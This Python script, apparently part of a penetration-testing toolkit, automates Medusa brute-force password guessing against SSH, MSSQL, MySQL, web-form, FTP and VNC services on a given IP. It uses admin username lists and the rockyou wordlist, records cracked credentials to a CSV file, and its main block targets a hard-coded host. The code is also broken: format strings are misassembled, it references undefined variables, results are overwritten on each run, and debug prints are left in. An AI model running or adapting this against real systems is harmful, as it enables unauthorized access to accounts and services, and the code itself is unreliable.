#!/usr/bin/env python

import subprocess
import sys

def sshCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ssh > " + root + "password/ssh/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + ssh + "\n")
	fo.close()
	return

def mssqlCrack(ip_address, port, root):
	print("IM HERE")
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mssql > %spassword/mssql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/pw.txt", port, root, ip_address)	
	print ("AND HERE")
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + mssql + "\n")
	fo.close()
	return

def mysqlCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M mysql  > " + root + "password/mysql/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	print (MEDUSA)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + mysql + "\n")
	fo.close()
	return

def webformCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M web-form  > " + root + "password/http/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + web + "\n")
	fo.close()
	return

def ftpCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M ftp > " + root + "password/ftp/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + ftp + "\n")
	fo.close()
	return

def vncCrack(ip_address, port, root):
	MEDUSA = "medusa -h %s -U %s -P %s -v6 -n %s -e ns -M vnc > " + root + "password/vnc/medusa_%s.txt" % (ip_address, "/root/wordlists/admin_usernames.txt", "/root/wordlists/rockyou.txt", port, ip_address)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + vnc + "\n")
	fo.close()
	return
	
if __name__=='__main__':
	if sys.version_info[0] != 3 or sys.version_info[1] < 1:
		print("\nEXIT: This script requires Python version 3.1 or higher\n")
		sys.exit(1)
	mssqlCrack("192.168.1.248", "1433", "/root/TEST/")